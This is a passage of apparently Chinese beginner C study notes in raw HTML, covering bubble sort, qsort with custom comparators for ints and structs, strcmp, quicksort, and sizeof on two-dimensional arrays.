class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> ch = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((ch = getchar()) != EOF) &#123; </span><br><span class="line">    <span class="comment">//EOF意为-1。本语句即只要输入项是字符即可打印</span></span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">putchar</span>(ch + <span class="number">32</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指针进阶6"><a href="#指针进阶6" class="headerlink" title="指针进阶6"></a>指针进阶6</h3><p>复习冒泡排序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bubble_sort</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; sz - <span class="number">1</span> - i; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>])&#123;</span><br><span class="line">                <span class="type">int</span> tmp = arr[j + <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">                arr[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    bubble_sort(arr, sz);</span><br><span class="line">    print(arr, sz); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/rOnPdWCTq8RmgYL.png" alt="image.png"></p><h4 id="qsort-x2F-x2F-快速排序"><a href="#qsort-x2F-x2F-快速排序" class="headerlink" title="qsort();&#x2F;&#x2F;快速排序"></a>qsort();&#x2F;&#x2F;快速排序</h4><p>整型数据，字符串数据，结构体数据都可以排</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">qsort</span><span class="params">(<span class="type">void</span> *base,<span class="comment">//base 中存放的是待排序数据中第一个对象的地址 </span></span></span><br><span class="line"><span class="params">                 <span class="type">size_t</span> nitems, <span class="comment">//num 是待排序数据的元素个数</span></span></span><br><span class="line"><span class="params">                 <span class="type">size_t</span> size, <span class="comment">//size 排序中一个元素的大小 </span></span></span><br><span class="line"><span class="params">                 <span class="type">int</span> (*compar)(<span class="type">const</span> <span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span>*) <span class="comment">//指向函数的指针，用于确定排序的顺序（需要用户自定义一个比较函数） </span></span></span><br><span class="line"><span class="params">                 )</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">//因为void不知道什么类型，所以要先强制转换类型，而qsort对比较函数只要求和0的关系</span></span><br><span class="line"><span class="comment">//所以直接return 差值即可 </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cmp_int</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span>*)e1 - *(<span class="type">int</span>*)e2;</span><br><span class="line"> &#125; </span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[<span class="number">10</span>] = &#123;<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    qsort(arr, sz, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]), cmp_int);</span><br><span class="line">    print(arr, sz); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/PoDyjkpAuZ8CMmf.png" alt="image.png"></p><h4 id="qsort函数排序结构体"><a href="#qsort函数排序结构体" class="headerlink" title="qsort函数排序结构体"></a>qsort函数排序结构体</h4><p>1.按年龄排序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">int</span> <span class="title function_">sort_by_age</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">struct</span> Stu*)e1)-&gt;age - ((<span class="keyword">struct</span> Stu*)e2)-&gt;age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> Stu s[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> *<span class="title">p</span>;</span></span><br><span class="line">    p = s;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Stu%d\n&quot;</span>,i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;name:%s\n&quot;</span>, p-&gt;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;age:%d\n&quot;</span>, p-&gt;age);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//使用qsort排序结构体数据 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> <span class="title">s</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="string">&quot;zhangsan&quot;</span>, <span class="number">30</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;liso&quot;</span>, <span class="number">35</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;wangwu&quot;</span>, <span class="number">20</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(s) / <span class="keyword">sizeof</span>(s[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//按年龄排序</span></span><br><span class="line">    </span><br><span class="line">    qsort(s, sz, <span class="keyword">sizeof</span>(s[<span class="number">0</span>]), sort_by_age);</span><br><span class="line">    print(s, sz);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    test2();</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/I8lagQoBthpbJdj.png" alt="image.png"></p><p>2.按名字排序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Stu</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">int</span> <span class="title function_">sort_by_name</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(((<span class="keyword">struct</span> Stu*)e1)-&gt;name, ((<span class="keyword">struct</span> Stu*)e2)-&gt;name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(<span class="keyword">struct</span> Stu s[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> *<span class="title">p</span>;</span></span><br><span class="line">    p = s;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Stu%d\n&quot;</span>,i);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;name:%s\n&quot;</span>, p-&gt;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;age:%d\n&quot;</span>, p-&gt;age);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        p++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//使用qsort排序结构体数据 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Stu</span> <span class="title">s</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="string">&quot;zhangsan&quot;</span>, <span class="number">30</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;liso&quot;</span>, <span class="number">35</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;wangwu&quot;</span>, <span class="number">20</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(s) / <span class="keyword">sizeof</span>(s[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">//按名字排序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;突然想看下s中元素的大小%d\n&quot;</span>,<span class="keyword">sizeof</span>(s[<span class="number">0</span>]));</span><br><span class="line">    qsort(s, sz, <span class="keyword">sizeof</span>(s[<span class="number">0</span>]), sort_by_name);</span><br><span class="line">    print(s, sz);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    test2();</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p><em>一个char 8bit&#x3D;1byte 一个int 4byte 所以是24</em><br><img src="https://s2.loli.net/2023/03/12/LwpS6mz3bsEPlid.png" alt="image.png"></p><p>3.突然想看下string.h中的strcmp源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">strcmp</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> * src,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">char</span> * dst</span></span><br><span class="line"><span class="params">        )</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((ret = *(<span class="type">unsigned</span> <span class="type">char</span> *)src - *(<span class="type">unsigned</span> <span class="type">char</span> *)dst) == <span class="number">0</span> &amp;&amp; *dst)</span><br><span class="line">                &#123;</span><br><span class="line">                ++src, ++dst;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ((-ret) &lt; <span class="number">0</span>) - (ret &lt; <span class="number">0</span>); <span class="comment">// (if positive) - (if negative) generates branchless code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看不懂，试着自己实现一个</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">str_cmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str1, <span class="type">const</span> <span class="type">char</span>* str2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (*str1 == *str2) &#123;</span><br><span class="line">        str1++;</span><br><span class="line">        str2++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> ret = *str1 - *str2;</span><br><span class="line">    <span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str1[] = <span class="string">&quot;abcde&quot;</span>;</span><br><span class="line">    <span class="type">char</span> str2[] = <span class="string">&quot;bca&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,str_cmp(str1, str2));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/12/U2tR96KOhZ5X7YP.png" alt="image.png"></p><h2 id="模仿qsort实现冒泡排序"><a href="#模仿qsort实现冒泡排序" class="headerlink" title="模仿qsort实现冒泡排序"></a>模仿qsort实现冒泡排序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Swap</span><span class="params">(<span class="type">char</span>* buf1, <span class="type">char</span>* buf2, <span class="type">int</span> width)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; width; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> tmp = *buf1;</span><br><span class="line">        *buf1 = *buf2;</span><br><span class="line">        *buf2 =tmp;</span><br><span class="line">        buf1++;</span><br><span class="line">        buf2++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//模仿qsort实验一个冒泡排序的通用算法 </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bubble_sort</span><span class="params">(<span class="type">void</span>* base,</span></span><br><span class="line"><span class="params">                <span class="type">int</span> sz,<span class="comment">//元素个数 </span></span></span><br><span class="line"><span class="params">                <span class="type">int</span> width, <span class="comment">//元素大小（几个字节） </span></span></span><br><span class="line"><span class="params">                <span class="type">int</span> (*cmp)(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line"><span class="params">                )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//sz个元素进行sz-1趟 </span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz <span class="number">-1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//一趟排序 </span></span><br><span class="line">        <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; sz - <span class="number">1</span> - i; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//两个元素比较 </span></span><br><span class="line">            <span class="comment">//arr[j] arr[j+1]</span></span><br><span class="line">            <span class="keyword">if</span> (cmp((<span class="type">char</span>*)base + j * width, (<span class="type">char</span>*)base + (j + <span class="number">1</span>) * width) &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//交换 </span></span><br><span class="line">                Swap((<span class="type">char</span>*)base + j * width, (<span class="type">char</span>*)base + (j + <span class="number">1</span>) * width, width);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125; </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">cmp_int</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* e1, <span class="type">const</span> <span class="type">void</span>* e2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">int</span>*)e1 - *(<span class="type">int</span>*)e2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> arr[], <span class="type">int</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; sz; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> arr[] = &#123; <span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">9</span> &#125;;</span><br><span class="line">    <span class="type">int</span> sz = <span class="keyword">sizeof</span>(arr) / <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]);</span><br><span class="line">    bubble_sort(arr, sz, <span class="keyword">sizeof</span>(arr[<span class="number">0</span>]), cmp_int);</span><br><span class="line">    print_arr(arr, sz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="折半排序"><a href="#折半排序" class="headerlink" title="折半排序"></a>折半排序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">CelerityRun</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> <span class="built_in">array</span>[])</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    CelerityRun(<span class="number">0</span>, <span class="number">9</span>, a);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, a[i]);</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">4</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">CelerityRun</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right, <span class="type">int</span> <span class="built_in">array</span>[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    <span class="type">int</span> middle,iTemp;</span><br><span class="line">    i = left;</span><br><span class="line">    j = right;</span><br><span class="line">    middle = <span class="built_in">array</span>[(left+right) / <span class="number">2</span>]; <span class="comment">//求中间值 </span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>((<span class="built_in">array</span>[i] &lt; middle) &amp;&amp; (i &lt; right)) <span class="comment">//从左找小于中间值的数 </span></span><br><span class="line">            i++;</span><br><span class="line">        <span class="keyword">while</span>((<span class="built_in">array</span>[j] &gt; middle) &amp;&amp; (j &gt; left)) <span class="comment">//从右找大于中间值的数 </span></span><br><span class="line">            j--;</span><br><span class="line">        <span class="keyword">if</span> (i &lt;= j)</span><br><span class="line">        &#123;</span><br><span class="line">            iTemp = <span class="built_in">array</span>[i];</span><br><span class="line">            <span class="built_in">array</span>[i] = <span class="built_in">array</span>[j];</span><br><span class="line">            <span class="built_in">array</span>[j] = iTemp;</span><br><span class="line">            i++;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">while</span>(i &lt;= j);</span><br><span class="line">    <span class="comment">/* 递归左半边 */</span></span><br><span class="line">    <span class="keyword">if</span> (left &lt; j)</span><br><span class="line">        CelerityRun(left, j, <span class="built_in">array</span>);</span><br><span class="line">    <span class="comment">/* 递归右半边 */</span> </span><br><span class="line">    <span class="keyword">if</span> (right &gt; i)</span><br><span class="line">        CelerityRun(i, right, <span class="built_in">array</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/19/WOIY92Lg7FAVKlo.png" alt="image.png"></p><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">3</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a));<span class="comment">//48=3*4*sizeof(int) </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">0</span>][<span class="number">0</span>]));<span class="comment">//4 - a[0][0]-是第一行第一个元素 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">0</span>]));<span class="comment">//16 第一行 4*4个int </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">0</span>]+<span class="number">1</span>));<span class="comment">//4</span></span><br><span class="line">                                         <span class="comment">/*a[0]作为数组名并没有单独放在sizeof内部 </span></span><br><span class="line"><span class="comment">                                         *也没取地址，所以a[0]是第一行第一个算的地址 </span></span><br><span class="line"><span class="comment">                                         *a[0]+1，就是第一行第二个元素的地址 </span></span><br><span class="line"><span class="comment">                                         *</span></span><br><span class="line"><span class="comment">                                         */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*(a[<span class="number">0</span>]+<span class="number">1</span>)));<span class="comment">//*(a[0]+1)==a[0][1] int 4 byte 第一行第二个元素 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a+<span class="number">1</span>));<span class="comment">//4/8  a是首元素地址，而二维数组数组名的首元素是第一行，</span></span><br><span class="line">                                     <span class="comment">//第一行的地址+1就是第二行的地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*(a+<span class="number">1</span>)));<span class="comment">//16 对第二行解引用，有4个元素， </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(&amp;a[<span class="number">0</span>]+<span class="number">1</span>));<span class="comment">//4/8 第一行的地址+1就是第二行的地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*(&amp;a[<span class="number">0</span>]+<span class="number">1</span>)));<span class="comment">//16 第二行解引用 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(*a));<span class="comment">//16 首元素即第一行地址，再解引用 ，没有&amp;没有单独放在sizeof内部 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">int</span>)<span class="keyword">sizeof</span>(a[<span class="number">3</span>]));<span class="comment">//16 a[3]其实是第四行的数组名，（如果有的话）</span></span><br><span class="line">                                      <span class="comment">// 所以其实不存在，但是也能通过类型计算大小 </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/25/p3ZUYXCMebPDJ2o.png" alt="image.png"><br>3+5<br>表达式</p><ol><li>值属性 8</li><li>类型性 int</li><li>a[3属]的类型 - int [4]</li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">short</span> s = <span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(s = a + <span class="number">6</span>));<span class="comment">//2 由s决定 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s);<span class="comment">//5  